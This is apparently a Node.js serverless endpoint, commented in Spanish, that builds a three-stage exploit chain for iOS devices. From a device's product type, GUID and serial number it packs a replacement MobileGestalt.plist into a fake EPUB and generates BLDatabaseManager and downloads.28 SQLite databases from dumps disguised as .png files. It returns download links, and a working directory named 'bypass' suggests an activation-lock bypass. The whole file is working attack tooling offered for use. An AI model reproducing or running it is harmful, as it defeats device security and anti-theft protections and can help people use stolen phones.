const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const archiver = require('archiver');
const Database = require('better-sqlite3');

// Función para generar nombre aleatorio
function generateRandomName(length = 16) {
    return crypto.randomBytes(length / 2).toString('hex');
}

// Función para crear SQLite desde dump SQL
function createSQLiteFromDump(sqlDump, outputPath) {
    // Procesar funciones unistr
    sqlDump = sqlDump.replace(/unistr\s*\(\s*['"]([^'"]*)['"]\s*\)/gi, (match, str) => {
        const processed = str.replace(/\\([0-9A-Fa-f]{4})/g, (m, hex) => {
            return String.fromCharCode(parseInt(hex, 16));
        });
        return `'${processed.replace(/'/g, "''")}'`;
    });

    const db = new Database(outputPath);
    const statements = sqlDump.split(';');
    
    for (const stmt of statements) {
        const trimmed = stmt.trim();
        if (trimmed.length > 5) {
            try {
                db.exec(trimmed + ';');
            } catch (e) {
                // Ignorar errores de SQL
            }
        }
    }
    db.close();
}

// Función para crear EPUB
async function createEpub(plistContent, outputPath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outputPath);
        const archive = archiver('zip', { store: true });
        
        output.on('close', () => resolve());
        archive.on('error', err => reject(err));
        
        archive.pipe(output);
        archive.append('application/epub+zip', { name: 'Caches/mimetype' });
        archive.append(plistContent, { name: 'Caches/com.apple.MobileGestalt.plist' });
        archive.finalize();
    });
}

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    try {
        const { prd, guid, sn } = req.query;

        if (!prd || !guid || !sn) {
            return res.status(400).json({
                success: false,
                error: 'Missing prd, guid, or sn parameters'
            });
        }

        // Formatear ProductType (reemplazar coma por guión)
        const prdFormatted = prd.replace(',', '-');
        
        // Obtener base URL
        const protocol = req.headers['x-forwarded-proto'] || 'https';
        const host = req.headers['host'];
        const baseUrl = `${protocol}://${host}`;

        // Leer plist del dispositivo
        const plistPath = path.join(process.cwd(), 'public', 'Maker', prdFormatted, 'com.apple.MobileGestalt.plist');
        
        if (!fs.existsSync(plistPath)) {
            return res.status(404).json({
                success: false,
                error: `Plist not found for device ${prd}`
            });
        }

        const plistContent = fs.readFileSync(plistPath);

        // Crear directorios temporales
        const tmpDir = path.join('/tmp', 'bypass');
        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

        // Stage 1: Crear EPUB
        const randomName1 = generateRandomName();
        const step1Dir = path.join(tmpDir, 'firststp', randomName1);
        fs.mkdirSync(step1Dir, { recursive: true });
        
        const fixedFilePath = path.join(step1Dir, 'fixedfile');
        await createEpub(plistContent, fixedFilePath);
        
        const fixedFileUrl = `${baseUrl}/api/download?type=step1&id=${randomName1}`;

        // Stage 2: BLDatabaseManager
        const blTemplatePath = path.join(process.cwd(), 'public', 'BLDatabaseManager.png');
        let blDump = fs.readFileSync(blTemplatePath, 'utf8');
        blDump = blDump.replace('KEYOOOOOO', fixedFileUrl);

        const randomName2 = generateRandomName();
        const step2Dir = path.join(tmpDir, '2ndd', randomName2);
        fs.mkdirSync(step2Dir, { recursive: true });
        
        const blDbPath = path.join(step2Dir, 'BLDatabaseManager.sqlite');
        createSQLiteFromDump(blDump, blDbPath);
        
        const blUrl = `${baseUrl}/api/download?type=step2&id=${randomName2}`;

        // Stage 3: downloads.28
        const dlTemplatePath = path.join(process.cwd(), 'public', 'downloads.28.png');
        let dlDump = fs.readFileSync(dlTemplatePath, 'utf8');
        dlDump = dlDump.replace('https://google.com', blUrl);
        dlDump = dlDump.replace('GOODKEY', guid);
        // Reemplazar URLs de badfile.plist
        dlDump = dlDump.replace(/http:\/\/192\.168\.\d+\.\d+:\d+\/badfile\.plist/g, `${baseUrl}/badfile.plist`);

        const randomName3 = generateRandomName();
        const step3Dir = path.join(tmpDir, 'last', randomName3);
        fs.mkdirSync(step3Dir, { recursive: true });
        
        const finalDbPath = path.join(step3Dir, 'downloads.28.sqlitedb');
        createSQLiteFromDump(dlDump, finalDbPath);
        
        const finalUrl = `${baseUrl}/api/download?type=step3&id=${randomName3}`;

        // Responder con las URLs
        return res.status(200).json({
            success: true,
            parameters: { prd, guid, sn },
            links: {
                step1_fixedfile: fixedFileUrl,
                step2_bldatabase: blUrl,
                step3_final: finalUrl
            },
            debug: {
                plist_used: plistPath,
                device: prdFormatted
            }
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
